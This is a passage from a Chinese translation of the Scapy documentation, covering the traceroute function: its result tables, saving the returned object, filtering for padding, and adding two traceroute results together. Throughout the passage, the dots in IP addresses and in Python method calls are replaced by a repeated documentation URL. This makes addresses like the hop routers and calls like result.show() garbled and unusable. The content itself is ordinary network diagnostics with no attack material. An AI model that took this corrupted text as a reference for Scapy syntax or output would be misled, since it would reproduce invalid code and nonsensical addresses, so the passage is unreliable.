4 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46
5 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/37 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/41 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/37 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/41
6 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/34 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/34 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/234 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/69
7 213https://wizardforcel.gitbooks.io/scapy-docs/content/248https://wizardforcel.gitbooks.io/scapy-docs/content/71https://wizardforcel.gitbooks.io/scapy-docs/content/141 217https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/149 208https://wizardforcel.gitbooks.io/scapy-docs/content/184https://wizardforcel.gitbooks.io/scapy-docs/content/231https://wizardforcel.gitbooks.io/scapy-docs/content/214 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/178
8 213https://wizardforcel.gitbooks.io/scapy-docs/content/248https://wizardforcel.gitbooks.io/scapy-docs/content/65https://wizardforcel.gitbooks.io/scapy-docs/content/81 217https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/224https://wizardforcel.gitbooks.io/scapy-docs/content/44 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/129 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/98
9 213https://wizardforcel.gitbooks.io/scapy-docs/content/248https://wizardforcel.gitbooks.io/scapy-docs/content/70https://wizardforcel.gitbooks.io/scapy-docs/content/14 213https://wizardforcel.gitbooks.io/scapy-docs/content/206https://wizardforcel.gitbooks.io/scapy-docs/content/129https://wizardforcel.gitbooks.io/scapy-docs/content/85 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/186 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/89
10 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 213https://wizardforcel.gitbooks.io/scapy-docs/content/206https://wizardforcel.gitbooks.io/scapy-docs/content/128https://wizardforcel.gitbooks.io/scapy-docs/content/160 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/122 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/254https://wizardforcel.gitbooks.io/scapy-docs/content/126
11 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/169https://wizardforcel.gitbooks.io/scapy-docs/content/41 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/28https://wizardforcel.gitbooks.io/scapy-docs/content/70 216https://wizardforcel.gitbooks.io/scapy-docs/content/115https://wizardforcel.gitbooks.io/scapy-docs/content/97https://wizardforcel.gitbooks.io/scapy-docs/content/178
12 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/226https://wizardforcel.gitbooks.io/scapy-docs/content/99 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/28https://wizardforcel.gitbooks.io/scapy-docs/content/209 66https://wizardforcel.gitbooks.io/scapy-docs/content/218https://wizardforcel.gitbooks.io/scapy-docs/content/64https://wizardforcel.gitbooks.io/scapy-docs/content/146
13 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/227https://wizardforcel.gitbooks.io/scapy-docs/content/106 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/45 66https://wizardforcel.gitbooks.io/scapy-docs/content/218https://wizardforcel.gitbooks.io/scapy-docs/content/82https://wizardforcel.gitbooks.io/scapy-docs/content/230
14 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/74https://wizardforcel.gitbooks.io/scapy-docs/content/30 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/214 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
15 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/120https://wizardforcel.gitbooks.io/scapy-docs/content/149 64https://wizardforcel.gitbooks.io/scapy-docs/content/124https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/109 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
16 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
17 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
18 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
19 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
20 193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
(&lt;Traceroute: UDP:0 TCP:28 ICMP:52 Other:0&gt;, &lt;Unanswered: UDP:0 TCP:0 ICMP:0 Other:0&gt;)</code></pre> 
<p>最后一行实际上是该函数的返回结果：traceroute返回一个对象和无应答数据包列表。traceroute返回的是一个经典返回对象更加特殊的版本（实际上是一个子类）。我们可以将其保存以备后用，或者是进行一些例如检查填充的更深层次的观察：</p> 
<pre><code>&gt;&gt;&gt; result,unans=_
&gt;&gt;&gt; resulthttps://wizardforcel.gitbooks.io/scapy-docs/content/show()
193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88:80 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79:80 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243:80 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254:80
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1
2 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
[https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/]
&gt;&gt;&gt; resulthttps://wizardforcel.gitbooks.io/scapy-docs/content/filter(lambda x: Padding in x[1])</code></pre> 
<p>和其他返回对象一样，traceroute对象也可以相加：</p> 
<pre><code>&gt;&gt;&gt; r2,unans=traceroute(["wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/voilahttps://wizardforcel.gitbooks.io/scapy-docs/content/com"],maxttl=20)
Received 19 packets, got 19 answers, remaining 1 packets
195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25:80
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1
2 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
4 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/169
5 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/162
6 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/161https://wizardforcel.gitbooks.io/scapy-docs/content/97
7 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/103https://wizardforcel.gitbooks.io/scapy-docs/content/86
8 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/103https://wizardforcel.gitbooks.io/scapy-docs/content/77
9 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/1
10 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/227https://wizardforcel.gitbooks.io/scapy-docs/content/245
12 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
13 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
14 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
15 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
16 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
17 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
18 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
19 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
20 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA
&gt;&gt;&gt;
&gt;&gt;&gt; r3=result+r2
&gt;&gt;&gt; r3https://wizardforcel.gitbooks.io/scapy-docs/content/show()
195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25:80 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13:80 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72:80 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243:80 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254:80
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1
2 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
4 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/169 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/169 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46 - 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/46
5 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/162 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/162 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/37 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/41 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/37
6 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/161https://wizardforcel.gitbooks.io/scapy-docs/content/97 194https://wizardforcel.gitbooks.io/scapy-docs/content/68https://wizardforcel.gitbooks.io/scapy-docs/content/129https://wizardforcel.gitbooks.io/scapy-docs/content/168 212https://wizardforcel.gitbooks.io/scapy-docs/content/27https://wizardforcel.gitbooks.io/scapy-docs/content/50https://wizardforcel.gitbooks.io/scapy-docs/content/34 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/234 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/69
7 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/103https://wizardforcel.gitbooks.io/scapy-docs/content/86 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/42https://wizardforcel.gitbooks.io/scapy-docs/content/33 217https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/185 208https://wizardforcel.gitbooks.io/scapy-docs/content/184https://wizardforcel.gitbooks.io/scapy-docs/content/231https://wizardforcel.gitbooks.io/scapy-docs/content/214 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/178
8 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/103https://wizardforcel.gitbooks.io/scapy-docs/content/77 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/42https://wizardforcel.gitbooks.io/scapy-docs/content/6 217https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/224https://wizardforcel.gitbooks.io/scapy-docs/content/44 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/129 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/98
9 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/1 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 213https://wizardforcel.gitbooks.io/scapy-docs/content/206https://wizardforcel.gitbooks.io/scapy-docs/content/129https://wizardforcel.gitbooks.io/scapy-docs/content/85 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/186 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/89
10 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/227https://wizardforcel.gitbooks.io/scapy-docs/content/245 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 213https://wizardforcel.gitbooks.io/scapy-docs/content/206https://wizardforcel.gitbooks.io/scapy-docs/content/128https://wizardforcel.gitbooks.io/scapy-docs/content/160 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/122 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/254https://wizardforcel.gitbooks.io/scapy-docs/content/126
11 - 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/169https://wizardforcel.gitbooks.io/scapy-docs/content/41 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/28https://wizardforcel.gitbooks.io/scapy-docs/content/70 216https://wizardforcel.gitbooks.io/scapy-docs/content/115https://wizardforcel.gitbooks.io/scapy-docs/content/97https://wizardforcel.gitbooks.io/scapy-docs/content/178
12 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/226https://wizardforcel.gitbooks.io/scapy-docs/content/100 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/28https://wizardforcel.gitbooks.io/scapy-docs/content/209 216https://wizardforcel.gitbooks.io/scapy-docs/content/115https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/46
